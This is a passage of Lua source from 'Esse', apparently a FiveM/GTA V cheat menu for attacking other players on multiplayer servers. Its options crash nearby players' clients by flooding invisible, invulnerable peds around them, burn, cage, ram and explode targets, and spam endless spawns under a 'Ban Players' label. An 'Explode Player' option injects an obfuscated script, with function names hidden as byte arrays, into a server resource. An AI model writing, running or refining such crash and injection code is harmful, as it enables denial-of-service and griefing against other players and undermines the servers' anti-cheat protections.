                                        -- Itaas pa lalo ng 1500m
                                        local currentPos = GetEntityCoords(myPed)
                                        local finalZ = currentPos.z + 1500.0
                                        SetEntityCoords(myPed, currentPos.x, currentPos.y, finalZ, false, false,
                                            false, false)
                                        GiveWeaponToPed(myPed, GetHashKey("GADGET_PARACHUTE"), 1, false, true)

                                        self:Notify("success", "Esse",
                                            "Ini-crash si player " ..
                                            targetServerId .. " gamit ang " .. selectedModel, 5000)
                                    end, "typeable")
                            end
                        },




                        {
                            icon = "",
                            type = "button",
                            label = "Crash Nearby BETA",
                            desc = "Crashes Nearby Players.",
                            onSelect = function()
                                local Config = {
                                    pedModel = "player_one",
                                    spawnRadius = 4.5,
                                    totalPeds = 110,
                                    spawnDelay = 200,
                                    lifetimeDuration = 3500,
                                    batchSize = 6,
                                    menuKey = 170 -- F3 key (change if needed)
                                }

                                -- State management
                                local SpawnState = {
                                    active = false,
                                    executed = false,
                                    entities = {}
                                }

                                local MenuState = {
                                    isOpen = false,
                                    selectedIndex = 1,
                                    playerList = {},
                                    scrollOffset = 0,
                                    maxVisible = 10
                                }

                                -- ========================================
                                -- MENU FUNCTIONS
                                -- ========================================

                                local function RefreshPlayerList()
                                    MenuState.playerList = {}

                                    for _, playerId in ipairs(GetActivePlayers()) do
                                        if playerId ~= PlayerId() then
                                            local playerPed = GetPlayerPed(playerId)
                                            if DoesEntityExist(playerPed) then
                                                local serverID = GetPlayerServerId(playerId)
                                                local playerName = GetPlayerName(playerId)
                                                local distance = #(GetEntityCoords(PlayerPedId()) - GetEntityCoords(playerPed))

                                                table.insert(MenuState.playerList, {
                                                    id = playerId,
                                                    serverId = serverID,
                                                    name = playerName,
                                                    distance = distance
                                                })
                                            end
                                        end
                                    end

                                    -- Sort by distance
                                    table.sort(MenuState.playerList, function(a, b)
                                        return a.distance < b.distance
                                    end)
                                end

                                local function DrawText3D(text, x, y, scale, font)
                                    SetTextFont(font or 4)
                                    SetTextProportional(0)
                                    SetTextScale(scale, scale)
                                    SetTextEdge(1, 0, 0, 0, 255)
                                    SetTextDropShadow(0, 0, 0, 0, 255)
                                    SetTextOutline()
                                    SetTextEntry("STRING")
                                    AddTextComponentString(text)
                                    DrawText(x, y)
                                end

                                local function DrawMenu()
                                    if not MenuState.isOpen then return end

                                    local screenW, screenH = GetActiveScreenResolution()
                                    local baseX = 0.20
                                    local baseY = 0.25
                                    local width = 0.25
                                    local headerHeight = 0.03
                                    local itemHeight = 0.025

                                    -- Background
                                    DrawRect(baseX + width / 2, baseY + 0.25, width, 0.52, 0, 0, 0, 200)

                                    -- Header
                                    DrawRect(baseX + width / 2, baseY + headerHeight / 2, width, headerHeight, 0, 0,
                                        0, 0)
                                    DrawText3D("~b~Esse Crasher V2.0 [Beta]", baseX + 0.05, baseY - 0.01, 0.7,
                                        wd4)
                                    DrawText3D("~w~Created By: WayZe", baseX + 0.08, baseY + 0.035, 0.35, 1)

                                    -- Instructions
                                    local instrY = baseY + headerHeight + 0.035
                                    DrawText3D("~b~[F3] Open/Close | [ENTER] Select | [ARROWS] Navigate",
                                        baseX + 0.030, instrY, 0.40, 4)

                                    -- Crowd crash option
                                    local crowdY = instrY + 0.04
                                    local crowdColor = MenuState.selectedIndex == 0 and "~b~→ " or "~w~   "
                                    DrawText3D(crowdColor .. "Esse Crasher Crasher V1 (Crowd Crash)",
                                        baseX + 0.07, crowdY, 0.40, 4)

                                    -- Divider
                                    DrawRect(baseX + width / 2, crowdY + 0.040, width - 0.01, 0.002, 250, 250, 255,
                                        255)

                                    -- Player list header
                                    local listHeaderY = crowdY + 0.05
                                    DrawText3D("~b~Online Players:", baseX + 0.10, listHeaderY, 0.40, 4)

                                    if #MenuState.playerList == 0 then
                                        DrawText3D(
                                        "~w~           No Players Found. Press [RIGHTCTRL] To Refresh List.",
                                            baseX + 0.004, listHeaderY + 0.04, 0.40, 4)
                                        return
                                    end

                                    -- Player list
                                    local startY = listHeaderY + 0.04
                                    local visibleStart = MenuState.scrollOffset
                                    local visibleEnd = math.min(MenuState.scrollOffset + MenuState.maxVisible,
                                        #MenuState.playerList)

                                    for i = visibleStart + 1, visibleEnd do
                                        local player = MenuState.playerList[i]
                                        local yPos = startY + ((i - visibleStart - 1) * itemHeight)

                                        local isSelected = MenuState.selectedIndex == i
                                        local prefix = isSelected and "~b~→ " or "~w~   "
                                        local distText = string.format("%.0fm", player.distance)

                                        local displayText = string.format("%s[%d] %s ~c~(%s)",
                                            prefix, player.serverId, player.name, distText)

                                        DrawText3D(displayText, baseX + 0.09, yPos, 0.35, 4)
                                    end

                                    -- Scroll indicator
                                    if #MenuState.playerList > MenuState.maxVisible then
                                        local scrollY = startY + (MenuState.maxVisible * itemHeight) + 0.02
                                        DrawText3D(string.format("~y~Showing %d-%d of %d",
                                                visibleStart + 1, visibleEnd, #MenuState.playerList),
                                            baseX + 0.005, scrollY, 0.3, 4)
                                    end
                                end

                                local function HandleMenuInput()
                                    if not MenuState.isOpen then return end

                                    -- Navigate up
                                    if IsControlJustPressed(0, 172) then -- Up arrow
                                        MenuState.selectedIndex = MenuState.selectedIndex - 1
                                        if MenuState.selectedIndex < 0 then
                                            MenuState.selectedIndex = #MenuState.playerList
                                        end

                                        -- Adjust scroll
                                        if MenuState.selectedIndex < MenuState.scrollOffset + 1 then
                                            MenuState.scrollOffset = math.max(0, MenuState.selectedIndex - 1)
                                        end
                                    end

                                    -- Navigate down
                                    if IsControlJustPressed(0, 173) then -- Down arrow
                                        MenuState.selectedIndex = MenuState.selectedIndex + 1
                                        if MenuState.selectedIndex > #MenuState.playerList then
                                            MenuState.selectedIndex = 0
                                        end

                                        -- Adjust scroll
                                        if MenuState.selectedIndex > MenuState.scrollOffset + MenuState.maxVisible then
                                            MenuState.scrollOffset = MenuState.selectedIndex - MenuState.maxVisible
                                        end
                                    end

                                    -- Select/Execute
                                    if IsControlJustPressed(0, 191) then -- Enter
                                        if MenuState.selectedIndex == 0 then
                                            -- Crowd crash
                                            MenuState.isOpen = false
                                            ExecuteSpawn(nil)
                                        elseif MenuState.selectedIndex > 0 and MenuState.selectedIndex <= #MenuState.playerList then
                                            -- Single target
                                            local target = MenuState.playerList[MenuState.selectedIndex]
                                            MenuState.isOpen = false
                                            ExecuteSpawn(target.id)
                                        end
                                    end

                                    -- Refresh list
                                    if IsControlJustPressed(0, 70) then -- Left arrow
                                        RefreshPlayerList()
                                        MenuState.selectedIndex = math.min(MenuState.selectedIndex,
                                            #MenuState.playerList)
                                    end
                                end

                                -- ========================================
                                -- UTILITY FUNCTIONS
                                -- ========================================

                                local function LocateNearestPlayer()
                                    local myPed = PlayerPedId()
                                    local myPos = GetEntityCoords(myPed)
                                    local nearestId = nil
                                    local shortestDist = math.huge

                                    for _, id in pairs(GetActivePlayers()) do
                                        if id ~= PlayerId() then
                                            local theirPed = GetPlayerPed(id)
                                            if DoesEntityExist(theirPed) and NetworkIsPlayerActive(id) then
                                                local theirPos = GetEntityCoords(theirPed)
                                                local dist = #(myPos - theirPos)
                                                if dist < shortestDist then
                                                    shortestDist = dist
                                                    nearestId = id
                                                end
                                            end
                                        end
                                    end

                                    return nearestId
                                end

                                local function ConfigurePed(ped, playerPed)
                                    SetEntityAlpha(ped, 0, false)
                                    SetEntityVisible(ped, false, false)
                                    FreezeEntityPosition(ped, true)

                                    SetEntityCollision(ped, false, false)
                                    SetEntityCompletelyDisableCollision(ped, false, false)
                                    SetEntityNoCollisionEntity(ped, playerPed, true)
                                    SetEntityNoCollisionEntity(playerPed, ped, true)

                                    SetEntityCanBeDamaged(ped, false)
                                    SetEntityInvincible(ped, true)
                                    SetEntityProofs(ped, true, true, true, true, true, true, true, true)

                                    SetPedCanRagdoll(ped, false)
                                    SetPedCanRagdollFromPlayerImpact(ped, false)

                                    local flags = { 17, 128, 149, 223, 229, 281, 287, 292, 297, 301, 430, 435 }
                                    for _, flag in ipairs(flags) do
                                        SetPedConfigFlag(ped, flag, true)
                                    end

                                    SetBlockingOfNonTemporaryEvents(ped, true)
                                    SetPedFleeAttributes(ped, 0, false)
                                    SetPedAsEnemy(ped, false)

                                    local combatAttrs = { 0, 5, 17, 46 }
                                    for _, attr in ipairs(combatAttrs) do
                                        SetPedCombatAttributes(ped, attr, false)
                                    end
                                    SetPedCombatAbility(ped, 0)
                                    SetPedCombatRange(ped, 0)
                                    SetPedCombatMovement(ped, 0)

                                    DisablePedPainAudio(ped, true)
                                    SetPedMute(ped, true)
                                    StopPedSpeaking(ped, true)

                                    SetPedSeeingRange(ped, 0.0)
                                    SetPedHearingRange(ped, 0.0)
                                    SetPedAlertness(ped, 0)
                                end

                                local function CalculateSpawnPosition(centerCoords, radius)
                                    local angle = math.random() * 2 * math.pi
                                    local distance = math.random() * radius
                                    local x = centerCoords.x + (distance * math.cos(angle))
                                    local y = centerCoords.y + (distance * math.sin(angle))
                                    local z = centerCoords.z

                                    local hasGround, groundZ = GetGroundZFor_3dCoord(x, y, z + 2.0, false)
                                    if hasGround then
                                        z = groundZ
                                    end

                                    return vector3(x, y, z)
                                end

                                local function CleanupEntities()
                                    for _, entity in ipairs(SpawnState.entities) do
                                        if DoesEntityExist(entity) then
                                            DeleteEntity(entity)
                                        end
                                    end
                                    SpawnState.entities = {}
                                end

                                -- ========================================
                                -- MAIN CRASHER EXECUTION
                                -- ========================================

                                function ExecuteSpawn(targetPlayerId)
                                    if SpawnState.active then
                                        return
                                    end

                                    SpawnState.active = true

                                    -- If no target specified, find nearest
                                    if not targetPlayerId then
                                        targetPlayerId = LocateNearestPlayer()
                                    end

                                    if not targetPlayerId then
                                        SpawnState.active = false
                                        return
                                    end

                                    local targetName = GetPlayerName(targetPlayerId)
                                    local targetServer = GetPlayerServerId(targetPlayerId)

                                    local modelHash = GetHashKey(Config.pedModel)
                                    RequestModel(modelHash)

                                    local timeout = 0
                                    while not HasModelLoaded(modelHash) and timeout < 50 do
                                        Citizen.Wait(100)
                                        timeout = timeout + 1
                                    end

                                    if not HasModelLoaded(modelHash) then
                                        SpawnState.active = false
                                        return
                                    end

                                    local myPed = PlayerPedId()
                                    local iterations = math.ceil(Config.totalPeds / Config.batchSize)

                                    for iteration = 1, iterations do
                                        local targetPed = GetPlayerPed(targetPlayerId)

                                        if not DoesEntityExist(targetPed) or not NetworkIsPlayerActive(targetPlayerId) then
                                            CleanupEntities()
                                            SetModelAsNoLongerNeeded(modelHash)
                                            SpawnState.active = false
                                            return
                                        end

                                        local targetCoords = GetEntityCoords(targetPed)

                                        for i = 1, Config.batchSize do
                                            local spawnPos = CalculateSpawnPosition(targetCoords, Config.spawnRadius)
                                            local heading = math.random(0, 359)

                                            local entity = CreatePed(28, modelHash, spawnPos.x, spawnPos.y,
                                                spawnPos.z, heading, true, false)

                                            if DoesEntityExist(entity) then
                                                ConfigurePed(entity, myPed)
                                                TaskWanderInArea(entity, spawnPos.x, spawnPos.y, spawnPos.z, 8.0, 8.0,
                                                    8.0)
                                                SetPedAsNoLongerNeeded(entity)
                                                table.insert(SpawnState.entities, entity)
                                            end
                                        end

                                        Citizen.Wait(Config.spawnDelay)
                                    end

                                    SetModelAsNoLongerNeeded(modelHash)

                                    Citizen.CreateThread(function()
                                        Citizen.Wait(Config.lifetimeDuration)
                                        CleanupEntities()
                                        SpawnState.active = false
                                    end)
                                end

                                -- ========================================
                                -- MAIN THREADS
                                -- ========================================

                                -- Menu display thread
                                Citizen.CreateThread(function()
                                    while true do
                                        Citizen.Wait(0)

                                        if MenuState.isOpen then
                                            DrawMenu()
                                            HandleMenuInput()
                                        end
                                    end
                                end)

                                -- Menu toggle thread
                                Citizen.CreateThread(function()
                                    while true do
                                        Citizen.Wait(0)

                                        if IsControlJustPressed(0, Config.menuKey) then -- F3 Key
                                            MenuState.isOpen = not MenuState.isOpen

                                            if MenuState.isOpen then
                                                RefreshPlayerList()
                                                MenuState.selectedIndex = 0
                                                MenuState.scrollOffset = 0
                                            else
                                            end
                                        end
                                    end
                                end)
                            end
                        },
                        {
                            type = "button",
                            label = "Cage Player",
                            desc = 'Spawn cage around player',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then targetPlayers[#targetPlayers + 1] = serverId end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                local model = GetHashKey("prop_gold_cont_01")
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(100) end
                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local coords = GetEntityCoords(GetPlayerPed(player))
                                        local cage = CreateObject(model, coords.x, coords.y, coords.z - 1.0, true,
                                            true, false)
                                        FreezeEntityPosition(cage, true)
                                    end
                                end
                                self:Notify("success", "Esse", "Caged " .. #targetPlayers .. " player(s)!", 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Set on Fire",
                            desc = 'Burn the player',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then targetPlayers[#targetPlayers + 1] = serverId end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local coords = GetEntityCoords(GetPlayerPed(player))
                                        StartScriptFire(coords.x, coords.y, coords.z, 25, true)
                                    end
                                end
                                self:Notify("success", "Esse", "Set " .. #targetPlayers .. " player(s) on fire!",
                                    3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Ram with Vehicle",
                            desc = "Send vehicle towards player",
                            onSelect = function()
                                local targetPlayers = {}

                                -- Collect selected players
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end

                                local vehModel = joaat("insurgent")
                                local pedModel = joaat("s_m_y_blackops_01")

                                RequestModel(vehModel)
                                RequestModel(pedModel)
                                while not HasModelLoaded(vehModel) or not HasModelLoaded(pedModel) do
                                    Wait(0)
                                end

                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 then
                                        local targetPed = GetPlayerPed(player)
                                        if DoesEntityExist(targetPed) then
                                            local coords = GetEntityCoords(targetPed)
                                            local heading = GetEntityHeading(targetPed)

                                            -- Spawn behind target
                                            local spawnDist = 40.0
                                            local spawnX = coords.x - math.sin(math.rad(heading)) * spawnDist
                                            local spawnY = coords.y + math.cos(math.rad(heading)) * spawnDist

                                            -- Create vehicle
                                            local veh = CreateVehicle(
                                                vehModel,
                                                spawnX,
                                                spawnY,
                                                coords.z + 1.0,
                                                heading,
                                                true,
                                                true
                                            )

                                            SetEntityAsMissionEntity(veh, true, true)
                                            SetVehicleOnGroundProperly(veh)
                                            SetVehicleEngineOn(veh, true, true)

                                            -- Power
                                            SetVehicleEnginePowerMultiplier(veh, 60.0)
                                            SetVehicleEngineTorqueMultiplier(veh, 60.0)
                                            SetVehicleCheatPowerIncrease(veh, 5.0)

                                            -- Driver
                                            local driver = CreatePedInsideVehicle(
                                                veh,
                                                4,
                                                pedModel,
                                                -1,
                                                true,
                                                false
                                            )

                                            SetBlockingOfNonTemporaryEvents(driver, true)
                                            SetDriverAggressiveness(driver, 1.0)
                                            SetPedDrivingStyle(driver, 786603)
                                            SetPedCombatAttributes(driver, 46, true)

                                            -- RAM TARGET
                                            TaskVehicleDriveToCoord(
                                                driver,
                                                veh,
                                                coords.x,
                                                coords.y,
                                                coords.z,
                                                120.0,
                                                0,
                                                vehModel,
                                                786603,
                                                1.0
                                            )
                                        end
                                    end
                                end

                                self:Notify("success", "Esse", "Ramming players!", 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Explode Vehicle Only",
                            desc = 'Blow up player vehicle',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then targetPlayers[#targetPlayers + 1] = serverId end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local veh = GetVehiclePedIsIn(GetPlayerPed(player), false)
                                        if veh ~= 0 then NetworkExplodeVehicle(veh, true, true, false) end
                                    end
                                end
                                self:Notify("success", "Esse", "Exploded vehicles!", 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Rain Money",
                            desc = 'Drop money bags around player',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then targetPlayers[#targetPlayers + 1] = serverId end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                local model = GetHashKey("prop_money_bag_01")
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(100) end
                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local coords = GetEntityCoords(GetPlayerPed(player))
                                        for i = 1, 20 do
                                            local bag = CreateObject(model, coords.x + math.random(-5, 5),
                                                coords.y + math.random(-5, 5), coords.z + 10.0, true, true, false)
                                            ApplyForceToEntity(bag, 1, 0.0, 0.0, -5.0, 0.0, 0.0, 0.0, 0, false, true,
                                                true, false, true)
                                        end
                                    end
                                end
                                self:Notify("success", "Esse", "Money rain!", 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Attach Cone",
                            desc = 'Attach traffic cone to player head',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then targetPlayers[#targetPlayers + 1] = serverId end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                local model = GetHashKey("prop_roadcone02a")
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(100) end
                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local ped = GetPlayerPed(player)
                                        local obj = CreateObject(model, 0.0, 0.0, 0.0, true, true, false)
                                        AttachEntityToEntity(obj, ped, GetPedBoneIndex(ped, 31086), 0.0, 0.0, 0.0,
                                            0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                    end
                                end
                                self:Notify("success", "Esse", "Cones attached!", 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Attach Christmas Tree",
                            desc = 'Attach tree to player',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then targetPlayers[#targetPlayers + 1] = serverId end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                local model = GetHashKey("prop_xmas_tree_int")
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(100) end
                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local ped = GetPlayerPed(player)
                                        local obj = CreateObject(model, 0.0, 0.0, 0.0, true, true, false)
                                        AttachEntityToEntity(obj, ped, GetPedBoneIndex(ped, 0), 0.0, 0.0, -1.0, 0.0,
                                            0.0, 0.0, true, true, false, true, 1, true)
                                    end
                                end
                                self:Notify("success", "Esse", "Trees attached!", 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Attach Toilet",
                            desc = 'Attach toilet to player',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then targetPlayers[#targetPlayers + 1] = serverId end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                local model = GetHashKey("prop_toilet_01")
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(100) end
                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local ped = GetPlayerPed(player)
                                        local obj = CreateObject(model, 0.0, 0.0, 0.0, true, true, false)
                                        AttachEntityToEntity(obj, ped, GetPedBoneIndex(ped, 0), 0.0, 0.0, 0.5, 0.0,
                                            0.0, 0.0, true, true, false, true, 1, true)
                                    end
                                end
                                self:Notify("success", "Esse", "Toilets attached!", 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Spawn UFO Above",
                            desc = 'Spawn UFO above player',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then targetPlayers[#targetPlayers + 1] = serverId end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                local model = GetHashKey("p_spinning_anus_s")
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(100) end
                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local coords = GetEntityCoords(GetPlayerPed(player))
                                        CreateObject(model, coords.x, coords.y, coords.z + 30.0, true, true, false)
                                    end
                                end
                                self:Notify("success", "Esse", "UFO spawned!", 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Strike Lightning",
                            desc = 'Lightning strike at player',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then targetPlayers[#targetPlayers + 1] = serverId end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "Select a player!", 3000)
                                    return
                                end
                                for _, sid in ipairs(targetPlayers) do
                                    local player = GetPlayerFromServerId(sid)
                                    if player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                                        local coords = GetEntityCoords(GetPlayerPed(player))
                                        AddExplosion(coords.x, coords.y, coords.z, 38, 1.0, true, false, 1.0)
                                    end
                                end
                                self:Notify("success", "Esse", "Lightning strike!", 3000)
                            end
                        },
                    }
                },
                {
                    label = "Risky",
                    tabs = {
                        {
                            type = "button",
                            label = "Explode Player",
                            desc = 'This will attempt to explode the player using a vehicle',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select a player to do this!", 3000)
                                    return
                                end

                                for _, sid in ipairs(targetPlayers) do
                                    local targetPlayer = sid
                                    local player = GetPlayerFromServerId(sid)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "Esse", "You must select a player to do this!", 3000)
                                        CPlayers[sid] = nil
                                        return
                                    else
                                        local script = [[
                                        local function decode(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function g(n)
                                            local func = _G[decode(n)]
                                            if not func then
                                                return nil
                                            end
                                            return func
                                        end
                                        local function wait(n)
                                            local waitFunc = g({87,97,105,116}) -- "Wait"
                                            if not waitFunc then
                                                return
                                            end
                                            return waitFunc(n)
                                        end

                                        local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                        local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                        if not requestModel then return end
                                        requestModel(vehicleName)

                                        local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                        if hasModelLoaded then
                                            local attempts = 0
                                            while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                wait(500)
                                                attempts = attempts + 1
                                            end
                                            if attempts >= 20 then
                                                return
                                            end
                                        end

                                        local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                        if not getPlayerFromServerId then return end
                                        local targetPlayer = getPlayerFromServerId(]] ..
                                        tostring(targetPlayer) .. [[)
                                        if targetPlayer == -1 then
                                            return
                                        end

                                        local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                        if not getPlayerPed then return end
                                        local targetPed = getPlayerPed(targetPlayer)
                                        if not targetPed or targetPed == 0 then
                                            return
                                        end

                                        local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                        if not localPlayerPed or localPlayerPed == 0 then
                                            return
                                        end

                                        local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                        local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                        local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                        if not getEntityCoords or not getEntityHeading then return end
                                        local targetPos = getEntityCoords(targetPed)
                                        local heading = getEntityHeading(targetPed)

                                        local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                        local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                        local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                        local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                        local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                        local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                        local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                        giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                        setCurrentWeapon(localPlayerPed, pistolHash, true)

                                        wait(1000) -- Wait 3 seconds before spawning vehicle

                                        local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                        if not createVehicle then return end
                                        local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                        local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                        if not vehicle or vehicle == 0 then
                                            return
                                        end

                                        if setMissionEntity then
                                            setMissionEntity(vehicle, true, true)
                                        end
                                        if setEntityHealth then
                                            setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                        end

                                        for i = 1, 60 do
                                            local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                            shootBullet(
                                                targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                            )
                                            wait(1) -- Slightly slower shooting for stability
                                        end

                                        removeWeapon(localPlayerPed, pistolHash)
                                    ]]
                                        MachoInjectResourceRaw("any", script, targetPlayer)
                                        self:Notify("success", "Esse", "Attempting to Explode Player", 5000)
                                    end
                                end

                                Esse:UpdateListMenu()
                            end
                        },

                        {
                            type = "button",
                            label = "Ban Players",
                            desc = 'This will Ban All Players',
                            onSelect = function()
                                local pedModel =
                                "A_CHumpBack" -- اسم الحيوان الي ينزل على اللاعبين  طبعاا انا حاطلك دلفين كبير يزعج اللاعبين خله لاتغيره

                                Citizen.CreateThread(function()
                                    while true do
                                        RequestModel(pedModel)

                                        while not HasModelLoaded(pedModel) do
                                            Wait(100)
                                        end

                                        local playerList = GetActivePlayers()
                                        for _, playerId in ipairs(playerList) do
                                            local ped = GetPlayerPed(playerId)
                                            local pos = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)

                                            local horse = CreatePed(28, pedModel, pos.x, pos.y, pos.z, heading, true,
                                                false)
                                            TaskWanderInArea(horse, pos.x, pos.y, pos.z, 10.0, 10.0, 10.0)
                                            SetPedAsNoLongerNeeded(horse)
                                        end

                                        Citizen.Wait(350)
                                    end
                                end)
                            end
                        },

                        { type = "divider", label = "Ped Options" },
                        {
                            type = "button",
                            label = "Clone Player",
                            desc = 'Spawn Clone player On Player',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select a player to do this!", 3000)
                                    return
                                end
                                self:HandleClonePlayer(targetPlayers)
                                self:Notify("success", "Esse", "Cloned Player", 5000)
                            end
                        },
                        {
                            type = "button",
                            label = "Attack Clone Player",
                            desc = 'Spawn clone player attack him',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleAttackClonePlayer(targetPlayers)
                                self:Notify("success", "Esse", "Cloned Player", 5000)
                            end
                        },
                        { type = "divider", label = "Vehicle Options" },
                        {
                            type = "scrollable",
                            label = "Attach Vehicle",
                            desc = 'choose a car to attach on selected player',
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "bmx", "sanchez", "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "oppressor", "maverick", "buzzard", "cargobob", "t20", "comet", "kuruma",
                                "zentorno", "entityxf", "carbonizzare", "elegy", "massacro", "vagner",
